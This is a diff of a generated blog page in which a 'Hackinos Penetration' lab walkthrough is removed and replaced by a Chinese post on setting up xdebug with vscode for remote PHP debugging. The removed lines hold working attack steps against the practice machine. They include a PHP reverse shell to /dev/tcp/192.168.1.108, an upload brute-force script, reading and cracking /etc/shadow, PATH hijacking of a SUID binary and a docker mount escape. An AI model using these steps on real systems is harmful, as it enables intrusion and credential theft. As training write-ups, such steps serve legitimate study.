@@ -82,34 +82,20 @@
 
 
 
-<meta name="description" content="hackinos from vulhub this time , I tried to follow chailao’s steps to break the target-shooting machine and of course, learned a lot 😃 first, use sudo netdiscover or sudo arp-scan -l to discover the">
+<meta name="description" content="为了避开windows下debug时候可能出现的怪异问题, 我花了一个晚上搭建了xdebug+vscode的远程调试环境, 特此记录 vscode的php调试插件有坑, 还是用phpstorm吧  requirement  client  vscode vscode plugin: php debug firefox(chrome) xdebug plugin   Server  xdebug">
 <meta name="keywords" content="CTF WEB">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Hackinos Penetration">
-<meta property="og:url" content="http://yoursite.com/2019/05/03/Hackinos-Penetration/index.html">
+<meta property="og:title" content="使用vscode和xdebug实现远程调试虚拟机中的php项目">
+<meta property="og:url" content="http://yoursite.com/2019/12/16/vscode-vmware-xdebug/index.html">
 <meta property="og:site_name" content="CH4SER || 自闭室">
-<meta property="og:description" content="hackinos from vulhub this time , I tried to follow chailao’s steps to break the target-shooting machine and of course, learned a lot 😃 first, use sudo netdiscover or sudo arp-scan -l to discover the">
+<meta property="og:description" content="为了避开windows下debug时候可能出现的怪异问题, 我花了一个晚上搭建了xdebug+vscode的远程调试环境, 特此记录 vscode的php调试插件有坑, 还是用phpstorm吧  requirement  client  vscode vscode plugin: php debug firefox(chrome) xdebug plugin   Server  xdebug">
 <meta property="og:locale" content="default">
-<meta property="og:image" content="https://user-images.githubusercontent.com/40637063/57022143-d7852c00-6c60-11e9-8f8a-ccb35b4f5a6e.png">
-<meta property="og:image" content="https://user-images.githubusercontent.com/40637063/57022147-d94eef80-6c60-11e9-8ec0-0e8dadc0db10.png">
-<meta property="og:image" content="https://user-images.githubusercontent.com/40637063/57022161-dfdd6700-6c60-11e9-9128-b8a4a54ce9d3.png">
-<meta property="og:image" content="https://user-images.githubusercontent.com/40637063/57022150-dbb14980-6c60-11e9-8e51-5145b102b578.png">
-<meta property="og:image" content="https://user-images.githubusercontent.com/40637063/57022155-dce27680-6c60-11e9-9347-f4fc67860a6c.png">
-<meta property="og:image" content="https://user-images.githubusercontent.com/40637063/57026887-70ba3f80-6c6d-11e9-8d0d-490bbd3fc84e.png">
-<meta property="og:image" content="https://user-images.githubusercontent.com/40637063/57026962-9fd0b100-6c6d-11e9-983b-a7e2727773ae.png">
-<meta property="og:image" content="https://user-images.githubusercontent.com/40637063/57027064-f5a55900-6c6d-11e9-951a-5b427989dac1.png">
-<meta property="og:image" content="https://user-images.githubusercontent.com/40637063/57027318-a9a6e400-6c6e-11e9-8cc8-cbf9548e7e4f.png">
-<meta property="og:image" content="https://user-images.githubusercontent.com/40637063/57027323-aca1d480-6c6e-11e9-99d7-f2e8d00f0dc2.png">
-<meta property="og:image" content="https://user-images.githubusercontent.com/40637063/57027486-14581f80-6c6f-11e9-901c-7a631e5110d7.png">
-<meta property="og:image" content="https://user-images.githubusercontent.com/40637063/57027536-3a7dbf80-6c6f-11e9-9ece-33412b2a9c57.png">
-<meta property="og:image" content="https://user-images.githubusercontent.com/40637063/57027553-47021800-6c6f-11e9-8f34-08b8ca573de9.png">
-<meta property="og:image" content="https://user-images.githubusercontent.com/40637063/57027755-d6a7c680-6c6f-11e9-810e-5f6adb04337c.png">
-<meta property="og:image" content="https://user-images.githubusercontent.com/40637063/57027508-20dc7800-6c6f-11e9-9e1b-8839efc59354.png">
-<meta property="og:updated_time" content="2019-07-04T08:22:02.000Z">
+<meta property="og:image" content="https://user-images.githubusercontent.com/40637063/70918588-42516f00-205a-11ea-8d71-7da8fce60950.png">
+<meta property="og:updated_time" content="2019-12-18T13:35:35.676Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Hackinos Penetration">
-<meta name="twitter:description" content="hackinos from vulhub this time , I tried to follow chailao’s steps to break the target-shooting machine and of course, learned a lot 😃 first, use sudo netdiscover or sudo arp-scan -l to discover the">
-<meta name="twitter:image" content="https://user-images.githubusercontent.com/40637063/57022143-d7852c00-6c60-11e9-8f8a-ccb35b4f5a6e.png">
+<meta name="twitter:title" content="使用vscode和xdebug实现远程调试虚拟机中的php项目">
+<meta name="twitter:description" content="为了避开windows下debug时候可能出现的怪异问题, 我花了一个晚上搭建了xdebug+vscode的远程调试环境, 特此记录 vscode的php调试插件有坑, 还是用phpstorm吧  requirement  client  vscode vscode plugin: php debug firefox(chrome) xdebug plugin   Server  xdebug">
+<meta name="twitter:image" content="https://user-images.githubusercontent.com/40637063/70918588-42516f00-205a-11ea-8d71-7da8fce60950.png">
 
 
 
@@ -139,13 +125,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2019/05/03/Hackinos-Penetration/">
+  <link rel="canonical" href="http://yoursite.com/2019/12/16/vscode-vmware-xdebug/">
 
 
 
 
 
-  <title>Hackinos Penetration | CH4SER || 自闭室</title>
+  <title>使用vscode和xdebug实现远程调试虚拟机中的php项目 | CH4SER || 自闭室</title>
   
 
 
@@ -304,7 +290,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/05/03/Hackinos-Penetration/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/12/16/vscode-vmware-xdebug/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="ch4ser">
@@ -321,7 +307,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">Hackinos Penetration</h1>
+          <h1 class="post-title" itemprop="name headline">使用vscode和xdebug实现远程调试虚拟机中的php项目</h1>
         
 
         <div class="post-meta">
@@ -333,8 +319,8 @@
               
                 <span class="post-meta-item-text">Posted on</span>
               
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-05-03T03:51:39+08:00">
-                2019-05-03
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-12-16T22:59:33+08:00">
+                2019-12-16
               </time>
             
 
@@ -349,34 +335,12 @@
               
                 <span class="post-meta-item-text">Post modified&#58;</span>
               
-              <time title="Post modified" itemprop="dateModified" datetime="2019-07-04T16:22:02+08:00">
-                2019-07-04
+              <time title="Post modified" itemprop="dateModified" datetime="2019-12-18T21:35:35+08:00">
+                2019-12-18
               </time>
             
           </span>
 
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">In</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/靶机渗透/" itemprop="url" rel="index">
-                    <span itemprop="name">靶机渗透</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
           
 
           
@@ -399,7 +363,7 @@
                   <span class="post-meta-item-text">Words count in article&#58;</span>
                 
                 <span title="Words count in article">
-                  993
+                  369
                 </span>
               
 
@@ -415,7 +379,7 @@
                   <span class="post-meta-item-text">Reading time &asymp;</span>
                 
                 <span title="Reading time">
-                  6
+                  1
                 </span>
               
             </div>
@@ -436,76 +400,41 @@
       
 
       
-        <h2 id="hackinos-from-vulhub">hackinos from vulhub</h2>
-<p>this time , I tried to follow chailao’s steps to break the target-shooting machine and of course, learned a lot 😃</p>
-<p>first, use <code>sudo netdiscover</code> or <code>sudo arp-scan -l</code> to discover the machine.</p>
-<p><img src="https://user-images.githubusercontent.com/40637063/57022143-d7852c00-6c60-11e9-8f8a-ccb35b4f5a6e.png" alt="Screenshot from 2019-05-01 22-25-32"></p>
-<p>then , use <code>nmap -sV -p- {ip}</code> to verify the ports open to us.</p>
-<blockquote>
-<p>-sV: Probe open ports to determine service/version info</p>
+        <blockquote>
+<p><s>为了避开windows下debug时候可能出现的怪异问题, 我花了一个晚上搭建了xdebug+vscode的远程调试环境, 特此记录</s></p>
+<p>vscode的php调试插件有坑, 还是用phpstorm吧</p>
 </blockquote>
-<p>and here we got:</p>
-<p><img src="https://user-images.githubusercontent.com/40637063/57022147-d94eef80-6c60-11e9-8ec0-0e8dadc0db10.png" alt="Screenshot from 2019-05-01 22-26-05"></p>
-<p>next , check the web site and discover that it was made by <code>wordpress</code>.</p>
-<p><img src="https://user-images.githubusercontent.com/40637063/57022161-dfdd6700-6c60-11e9-9128-b8a4a54ce9d3.png" alt="Screenshot from 2019-05-01 22-27-21"><br>
-and try to implement a scan to it.</p>
-<p><img src="https://user-images.githubusercontent.com/40637063/57022150-dbb14980-6c60-11e9-8e51-5145b102b578.png" alt="Screenshot from 2019-05-01 22-28-33"></p>
-<p>here we find <code>robot.txt</code>, which contains something as follows:</p>
-<p><img src="https://user-images.githubusercontent.com/40637063/57022155-dce27680-6c60-11e9-9347-f4fc67860a6c.png" alt="Screenshot from 2019-05-01 22-30-17"></p>
-<p>so, get to upload.php and check the source code…there is a link where you can find the source code of php page.</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;div align=<span class="string">"center"</span>&gt;</span><br><span class="line">&lt;form action=<span class="string">""</span> method=<span class="string">"post"</span> enctype=<span class="string">"multipart/form-data"</span>&gt;</span><br><span class="line">    &lt;br&gt;</span><br><span class="line">    &lt;b&gt;Select image : &lt;/b&gt; </span><br><span class="line">    &lt;input type=<span class="string">"file"</span> name=<span class="string">"file"</span> id=<span class="string">"file"</span> style=<span class="string">"border: solid;"</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">"submit"</span> value=<span class="string">"Submit"</span> name=<span class="string">"submit"</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// Check if image file is a actual image or fake image</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">"submit"</span>])) &#123;</span><br><span class="line">	$rand_number = rand(<span class="number">1</span>,<span class="number">100</span>);</span><br><span class="line">	$target_dir = <span class="string">"uploads/"</span>;</span><br><span class="line">	$target_file = $target_dir . md5(basename($_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>].$rand_number));</span><br><span class="line">	$file_name = $target_dir . basename($_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>]);</span><br><span class="line">	$uploadOk = <span class="number">1</span>;</span><br><span class="line">	$imageFileType = strtolower(pathinfo($file_name,PATHINFO_EXTENSION));</span><br><span class="line">	$type = $_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>];</span><br><span class="line">	$check = getimagesize($_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>]);</span><br><span class="line">	<span class="keyword">if</span>($check[<span class="string">"mime"</span>] == <span class="string">"image/png"</span> || $check[<span class="string">"mime"</span>] == <span class="string">"image/gif"</span>)&#123;</span><br><span class="line">		$uploadOk = <span class="number">1</span>;</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		$uploadOk = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">":)"</span>;</span><br><span class="line">	&#125; </span><br><span class="line">  <span class="keyword">if</span>($uploadOk == <span class="number">1</span>)&#123;</span><br><span class="line">      move_uploaded_file($_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>], $target_file.<span class="string">"."</span>.$imageFileType);</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">"File uploaded /uploads/?"</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
-<p>as you can see, this waf only check out the <code>mime</code> , which can be passed with <code>GIF89a</code> as a header of any file. And the second question is : how to visit our <code>php</code> file uploaded?. The answer is <code>brute force</code> as there is only 100 possibilities of stored filename.</p>
-<p>shell.php:</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">exec(<span class="string">"/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.1.108/9998 0&gt;&amp;1'"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p><code>-i </code>means <code>interactive</code> ,and <code>&gt;&amp;</code> is another expression of <code>1&gt;filename 2&gt;&amp;1</code> or <code>2&gt;filname 1&gt;&amp;2</code>, which is equal to <code>&amp;&gt;</code>.<br>
-<code>0&gt;&amp;1</code>means redirecting the stdin to stdout, in this case , <code>stdin</code> ,<code>stdout</code> and <code>stderr</code> have all been redirect to us, thus we got a shell.</p>
-<p>see the link below:</p>
-<p><a href="https://superuser.com/questions/436586/why-redirect-output-to-21-and-12" target="_blank" rel="noopener">https://superuser.com/questions/436586/why-redirect-output-to-21-and-12</a></p>
-<p><a href="https://unix.stackexchange.com/questions/116010/meaning-of-bash-i-dev-tcp-host-port-01" target="_blank" rel="noopener">https://unix.stackexchange.com/questions/116010/meaning-of-bash-i-dev-tcp-host-port-01</a></p>
-<p><a href="https://stackoverflow.com/questions/818255/in-the-shell-what-does-21-mean" target="_blank" rel="noopener">https://stackoverflow.com/questions/818255/in-the-shell-what-does-21-mean</a></p>
-<p>and another script to visit the <code>shell.php</code>:</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">filename = <span class="string">'shell.php'</span></span><br><span class="line">url = <span class="string">'http://172.28.18.114:8000/uploads/'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">101</span>):</span><br><span class="line">    target = url + hashlib.md5(filename + str(i)).hexdigest() + <span class="string">'.php'</span></span><br><span class="line">    <span class="keyword">print</span> target</span><br><span class="line">    res = requests.get(target)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'Not'</span> <span class="keyword">not</span> <span class="keyword">in</span> res.content:</span><br><span class="line">        <span class="keyword">print</span> target</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'not found'</span></span><br></pre></td></tr></table></figure>
-<p>Meanwhile open our <code>nc -lvvkp 9998</code> on our server, and wait for the shell…</p>
-<p>But <code>www-data</code> is a low-right user. So, ckeck out enabled-execution by using <code>find / -perm -4000 2&gt;/dev/null</code>.</p>
-<p><img src="https://user-images.githubusercontent.com/40637063/57026887-70ba3f80-6c6d-11e9-8d0d-490bbd3fc84e.png" alt="Screenshot from 2019-05-01 23-02-01"></p>
-<p>and read <code>/etc/shadow</code> using <code>tail</code>.</p>
-<p><img src="https://user-images.githubusercontent.com/40637063/57026962-9fd0b100-6c6d-11e9-983b-a7e2727773ae.png" alt="Screenshot from 2019-05-01 23-03-05"></p>
-<p>copy the line start with <code>root</code> into a file and use <code>john {filename} --wordlist=/usr/share/wordlists/rockyou.txt</code></p>
-<p><img src="https://user-images.githubusercontent.com/40637063/57027064-f5a55900-6c6d-11e9-951a-5b427989dac1.png" alt="Screenshot from 2019-05-01 23-05-07"></p>
-<p>try<code>su</code> but failed with error message <code>su: must be run from a terminal</code>.<br>
-So~,we can use python to convert it to a terminal by using command as follows:</p>
-<p><code>python -c 'import pty;pty.spawn(&quot;/bin/bash&quot;)'</code></p>
-<p>then <code>su</code> could be used. Now check the <code>/root/flag</code>, which echos …<code>Life consists of details</code>.</p>
-<p><img src="https://user-images.githubusercontent.com/40637063/57027318-a9a6e400-6c6e-11e9-8cc8-cbf9548e7e4f.png" alt="Screenshot from 2019-05-01 23-09-32"></p>
-<p>Remember we got to know the website was built based on <code>wordpress</code>? Check the <code>/var/www/html/wp-config.php</code> and we got this:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">// ** MySQL settings - You can get this info from your web host ** //</span><br><span class="line">/** The name of the database for WordPress */</span><br><span class="line">define(&apos;DB_NAME&apos;, &apos;wordpress&apos;);</span><br><span class="line"></span><br><span class="line">/** MySQL database username */</span><br><span class="line">define(&apos;DB_USER&apos;, &apos;wordpress&apos;);</span><br><span class="line"></span><br><span class="line">/** MySQL database password */</span><br><span class="line">define(&apos;DB_PASSWORD&apos;, &apos;wordpress&apos;);</span><br><span class="line"></span><br><span class="line">/** MySQL hostname */</span><br><span class="line">define(&apos;DB_HOST&apos;, &apos;db:3306&apos;);</span><br><span class="line"></span><br><span class="line">/** Database Charset to use in creating database tables. */</span><br><span class="line">define(&apos;DB_CHARSET&apos;, &apos;utf8&apos;);</span><br><span class="line"></span><br><span class="line">/** The Database Collate type. Don&apos;t change this if in doubt. */</span><br><span class="line">define(&apos;DB_COLLATE&apos;, &apos;&apos;);</span><br></pre></td></tr></table></figure>
-<p>as the website server and database was seperated ,we should visit database as if it was a remote host:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql -h db -uwordpress -pwordpress</span><br><span class="line"></span><br><span class="line">show databases;</span><br><span class="line">use wordpress;</span><br><span class="line">show tables;</span><br><span class="line">select * from host_ssh_cred;</span><br></pre></td></tr></table></figure>
-<p><img src="https://user-images.githubusercontent.com/40637063/57027323-aca1d480-6c6e-11e9-99d7-f2e8d00f0dc2.png" alt="Screenshot from 2019-05-01 23-20-59"></p>
-<p>md5:<code>e10adc3949ba59abbe56e057f20f883e</code>,let’s crack it.</p>
-<p><img src="https://user-images.githubusercontent.com/40637063/57027486-14581f80-6c6f-11e9-901c-7a631e5110d7.png" alt="Screenshot from 2019-05-01 23-23-19"></p>
-<p><code>ssh hummingbirdscyber@172.28.18.114</code> and type our password:123456 to login.</p>
-<h3 id="solution-1">solution 1</h3>
-<p>try <code>find / -perm -u=s 2&gt;/dev/null</code> to find</p>
-<blockquote>
-<p>find the permission with SUID has been set, SUID will give the owner’s permission to the user who execute this file.</p>
-</blockquote>
-<p><img src="https://user-images.githubusercontent.com/40637063/57027536-3a7dbf80-6c6f-11e9-9ece-33412b2a9c57.png" alt="Screenshot from 2019-05-01 23-32-23"></p>
-<p>and try to execute the <code>a.out</code>,we got <code>root</code> as output.</p>
-<p>when trying to got to know the contant of the file, <code>cat</code> will display messy code ,while <code>strings</code> can display normally.</p>
-<p><img src="https://user-images.githubusercontent.com/40637063/57027553-47021800-6c6f-11e9-8f34-08b8ca573de9.png" alt="Screenshot from 2019-05-01 23-32-33"></p>
-<p>Noticed?,there is <code>whoami</code> ,which leads to the output <code>root</code>, so when we execute the <code>a.out</code>, our permission has become <code>root</code> <a href="http://temporarily.As" target="_blank" rel="noopener">temporarily.As</a> <code>whoami</code> is a system function which system PATH will involved in when it was executed. <code>function hijacked</code> could be implement.</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;/bin/bash&quot; &gt; /tmp/whoami</span><br><span class="line">chmod 777 /tmp/whoami</span><br><span class="line">export PATH=/tmp:$PATH</span><br><span class="line">./a.out</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>why create our <code>whoami</code> in <code>/tmp</code>? because every users has full right under this director.</p>
-</blockquote>
-<p>so , <code>root</code> open a bash, and we can visit <code>/root</code> on it.</p>
-<p><img src="https://user-images.githubusercontent.com/40637063/57027755-d6a7c680-6c6f-11e9-810e-5f6adb04337c.png" alt="Screenshot from 2019-05-02 00-18-27"></p>
-<h3 id="solution-2">solution 2</h3>
-<p><code>id</code> shows that we can use command <code>docker</code>, and we are <code>root</code> in the docker container. So, why not mapping our target folder to files in docker?just like this:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker images # and we found there is a ubuntu image</span><br><span class="line">docker run -it /:/root ubuntu</span><br></pre></td></tr></table></figure>
-<p>By visiting <code>/root/root/flag</code>, we got flag.</p>
-<p><img src="https://user-images.githubusercontent.com/40637063/57027508-20dc7800-6c6f-11e9-9e1b-8839efc59354.png" alt="Screenshot from 2019-05-01 23-29-41"></p>
+<h2 id="requirement">requirement</h2>
+<ul>
+<li>client
+<ul>
+<li>vscode</li>
+<li>vscode plugin: php debug</li>
+<li>firefox(chrome) xdebug plugin</li>
+</ul>
+</li>
+<li>Server
+<ul>
+<li>xdebug</li>
+</ul>
+</li>
+</ul>
+<h2 id="Installation">Installation</h2>
+<h3 id="xdebug">xdebug</h3>
+<p>在kali上</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">apt install php-pear</span><br><span class="line">apt install php-dev</span><br><span class="line">pecl install xdebug</span><br></pre></td></tr></table></figure>
+<p>在/etc/php/7.3/apache2/php.ini中添加</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[xdebug]</span><br><span class="line">zend_extension=/usr/lib/php/20180731/xdebug.so</span><br><span class="line">xdebug.remote_enable = true</span><br><span class="line">xdebug.remote_autostart = true</span><br><span class="line">xdebug.remote_host = 192.168.75.1</span><br><span class="line">xdebug.remote_port = 9000</span><br><span class="line">xdebug.remote_log = /var/log/xdebug.log</span><br><span class="line">xdebug.max_nesting_level = 1000</span><br></pre></td></tr></table></figure>
+<p>remote_host填写主机url, 然后</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service apache2 restart</span><br></pre></td></tr></table></figure>
+<p>然后通过phpinfo来检查xdebug是否已经启用</p>
+<h3 id="vscode">vscode</h3>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">ctrl+alt+p 打开launch.json</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    // Use IntelliSense to learn about possible attributes.</span><br><span class="line">    // Hover to view descriptions of existing attributes.</span><br><span class="line">    // For more information, visit: https://go.microsoft.com/fwlink/?linkid=830387</span><br><span class="line">    &quot;version&quot;: &quot;0.2.0&quot;,</span><br><span class="line">    &quot;configurations&quot;: [</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;name&quot;: &quot;Listen for XDebug&quot;,</span><br><span class="line">            &quot;type&quot;: &quot;php&quot;,</span><br><span class="line">            &quot;pathMappings&quot;: &#123;</span><br><span class="line">                &quot;/var/www/html/cms/tp6x&quot;: &quot;C:\\Users\\ch4ser__\\Desktop\\vscode_workspace\\tp6x&quot;,</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;request&quot;: &quot;launch&quot;,</span><br><span class="line">            &quot;port&quot;: 9000,</span><br><span class="line">            &quot;log&quot;: true,</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;name&quot;: &quot;Launch currently open script&quot;,</span><br><span class="line">            &quot;type&quot;: &quot;php&quot;,</span><br><span class="line">            &quot;request&quot;: &quot;launch&quot;,</span><br><span class="line">            &quot;program&quot;: &quot;$&#123;file&#125;&quot;,</span><br><span class="line">            &quot;cwd&quot;: &quot;$&#123;fileDirname&#125;&quot;,</span><br><span class="line">            &quot;port&quot;: 9000</span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>pathmapping 中, 服务器的web项目路径和本地主机的web项目路径要一致.</p>
+<p>这样就可以了</p>
+<h2 id="使用">使用</h2>
+<p>两个路径下都是一样的代码, 在vscode中下断点, 启动Listen for XDebug模式, 浏览器插件启动xdebug模式 并访问服务器的web路径, 这个时候vscode就到了断点处</p>
+<p><img src="https://user-images.githubusercontent.com/40637063/70918588-42516f00-205a-11ea-8d71-7da8fce60950.png" alt="image"></p>
 
       
     </div>
@@ -530,8 +459,8 @@ So~,we can use python to convert it to a terminal by using command as follows:</
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2019/04/22/流量分析/" rel="next" title="流量分析">
-                <i class="fa fa-chevron-left"></i> 流量分析
+              <a href="/2019/11/17/javascript-learn/" rel="next" title="javascript-learn">
+                <i class="fa fa-chevron-left"></i> javascript-learn
               </a>
             
           </div>
@@ -539,10 +468,6 @@ So~,we can use python to convert it to a terminal by using command as follows:</
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2019/05/11/2019-DDCTF-web/" rel="prev" title="2019 DDCTF web ">
-                2019 DDCTF web  <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -765,7 +690,7 @@ So~,we can use python to convert it to a terminal by using command as follows:</
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#hackinos-from-vulhub"><span class="nav-number">1.</span> <span class="nav-text">hackinos from vulhub</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#solution-1"><span class="nav-number">1.1.</span> <span class="nav-text">solution 1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#solution-2"><span class="nav-number">1.2.</span> <span class="nav-text">solution 2</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#requirement"><span class="nav-number">1.</span> <span class="nav-text">requirement</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Installation"><span class="nav-number">2.</span> <span class="nav-text">Installation</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#xdebug"><span class="nav-number">2.1.</span> <span class="nav-text">xdebug</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#vscode"><span class="nav-number">2.2.</span> <span class="nav-text">vscode</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#使用"><span class="nav-number">3.</span> <span class="nav-text">使用</span></a></li></ol></div>
             
 
           </div>
